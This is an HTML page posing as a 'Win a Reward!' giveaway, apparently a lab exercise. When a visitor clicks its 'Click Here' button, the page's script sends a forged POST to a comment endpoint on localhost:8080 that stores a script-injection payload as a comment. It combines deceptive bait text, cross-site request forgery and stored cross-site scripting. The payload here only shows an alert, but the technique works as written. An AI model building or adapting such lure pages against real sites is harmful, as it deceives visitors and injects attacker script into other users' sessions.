<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Win a Reward!</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #6a11cb, #2575fc);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
            text-align: center;
        }

        .container {
            background: rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            backdrop-filter: blur(10px);
            max-width: 400px;
            width: 100%;
        }

        h1 {
            font-size: 2.5rem;
            margin-bottom: 20px;
        }

        p {
            font-size: 1.2rem;
            margin-bottom: 30px;
        }

        .btn {
            background: #ff6f61;
            color: white;
            padding: 15px 30px;
            font-size: 1.2rem;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            transition: background 0.3s ease;
        }

        .btn:hover {
            background: #ff3b2f;
        }

        .btn:active {
            transform: scale(0.95);
        }
    </style>
    <script type="text/javascript">
        function uploadComment(event) {
            const postID = 2
            const userID = 2
            const newUserComment = {
                postID: postID,
                userID: userID,
                comment: "<script>alert('You have been hacked')<\/script>",
            };
            console.log("Sending data:", '/posts/' + postID + '/comments', JSON.stringify(newUserComment));
            debugger;
            fetch('http://localhost:8080/posts/' + postID + '/comments', {
                method: 'POST',
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(newUserComment),
            })
                .then(response => {
                    debugger;
                    if (!response.ok) {
                        console.error("did not succedded")
                    }
                    console.log("comment added")
                    debugger
                })
                .catch(error => {
                    console.error('There has been a problem with your fetch operation:', error);
                    debugger
                });
        }
    </script>
</head>
<body>
<div class="container">
    <h1>Win a Reward!</h1>
    <p>Click the button below to claim your surprise reward. Don't wait, it's just a click away!</p>
    <form onsubmit="uploadComment(event)">
        <input type="submit" class="btn" value="Click Here"/>
    </form>

</div>
</body>
</html>
